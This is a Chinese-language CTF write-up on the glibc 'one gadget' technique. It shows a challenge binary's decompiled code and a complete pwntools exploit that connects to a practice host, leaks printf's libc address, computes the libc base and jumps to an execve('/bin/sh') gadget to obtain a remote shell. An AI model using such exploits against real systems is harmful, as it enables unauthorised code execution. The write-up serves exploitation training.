# One Gadget

one-gadget 是glibc里调用`execve('/bin/sh', NULL, NULL)`的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用`system("sh")`，这个时候one gadget就可以搞定了

使用one_gadget工具进行获取oen_gadget

one_gadget工具安装:

github: https://github.com/david942j/one_gadget
```shell
sudo apt install ruby
sudo apt install gem
sudo gem install one_gadget
```

通过ida查看伪代码

```C++
  void (*v4)(void); // [rsp+8h] [rbp-18h]
  void (*v5)(void); // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  printf("Give me your one gadget:");
  __isoc99_scanf("%ld", &v4);
  v5 = v4;
  v4();
```

思路: 通过init打印出printf在libc中的地址, 然后计算libc基地址, 使用one_gadget打shell

exp如下:

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "one_gadget"
libFile  = "./libc-2.29.so"

remoteIp = "node3.buuoj.cn"
remotePort = 26163

LOCAL = 0
LIBC  = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru('0x')
	print_addr = int(r(12), 16)
	li('print_addr:' + hex(print_addr))
	lib_base = print_addr - lib.sym['printf']
	one_gadget =[0xe237f,0xe2383,0xe2386,0x106ef8]

	sh = lib_base + one_gadget[3]

	li('lib_base:' + hex(lib_base))
	li('OG addr:' + hex(sh))
	ru(':')
	p = str(sh)
	#db()
	sl(p)
	#a = 1


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIBC:
			lib = ELF(libFile)
		io = exe.process(env = {"LD_PRELOAD" : libFile})
		#io = exe.process()
	
	else:
		io = remote(remoteIp, remotePort)
		if LIBC:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
'''
	pwn@Ubuntu:~/share$ one_gadget libc-2.29.so 
	0xe237f execve("/bin/sh", rcx, [rbp-0x70])
	constraints:
	[rcx] == NULL || rcx == NULL
	[[rbp-0x70]] == NULL || [rbp-0x70] == NULL

	0xe2383 execve("/bin/sh", rcx, rdx)
	constraints:
	[rcx] == NULL || rcx == NULL
	[rdx] == NULL || rdx == NULL

	0xe2386 execve("/bin/sh", rsi, rdx)
	constraints:
    [rsi] == NULL || rsi == NULL
	[rdx] == NULL || rdx == NULL

	0x106ef8 execve("/bin/sh", rsp+0x70, environ)
	constraints:
	[rsp+0x70] == NULL
'''
```

